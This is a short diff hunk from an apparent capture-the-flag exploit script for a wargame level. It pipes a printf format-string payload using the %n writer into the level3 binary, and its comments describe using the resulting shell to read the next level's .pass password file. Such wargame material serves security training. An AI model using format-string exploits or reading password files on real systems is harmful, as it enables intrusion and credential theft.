@@ -31,7 +31,7 @@ PRINTF_WRITER="%${PRINTF_WRITER_INDEX}\$n"
 
 # We print our exploit to the input and wait for the reverse shell to open with cat
 INPUT="${PRINTF_ADDRESS}${PRINTF_VALUE_FILLER}${PRINTF_WRITER}"
-(echo "${INPUT}" && cat) | ./level3
+(echo "${INPUT}" && cat) | /home/user/level3/level3
 
 # We use the reverse shell to retrieve the password
 # $> cat /home/user/level4/.pass
